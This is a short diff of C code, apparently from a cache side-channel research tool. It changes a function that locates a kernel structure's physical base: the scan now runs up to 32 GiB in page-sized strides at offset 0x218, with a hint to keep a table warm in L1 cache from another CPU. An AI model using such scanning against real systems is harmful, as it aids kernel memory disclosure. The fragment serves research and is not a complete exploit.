@@ -307,16 +307,17 @@ void pin_cpu(void) {
 }
 
 void *find_base(void *buf) {
-  fprintf(
-      stderr,
-      "On a diffent CPU, run access_min with index 0 to continiously bring the table into L1 data cache.\n");
+  fprintf(stderr, "On a different CPU, run access_min with index 0 to continiously bring the table into L1 "
+                  "data cache.\n");
 
   scan_opts_t opts;
-  opts.start = 0x15880c730;
-  opts.end = 0x158a0c730;
-  opts.stride = 8;
-  unsigned char needle[] = {0xff, 0xff};
-  do_scan(opts, 2, (char *)needle);
+  // It seems that map->phys_map[0] is always at offset 0x218 in a page, but this
+  // might change between kernel versions. But if this is the case, scanning becomes way faster
+  // because you can have a stride of 1 page instead of 8 bytes.
+  opts.start = 0x218;
+  opts.end = 34359738368; // 32 GiB
+  opts.stride = 4096;
+  find_ffff_values(opts);
 
   return NULL;
 }
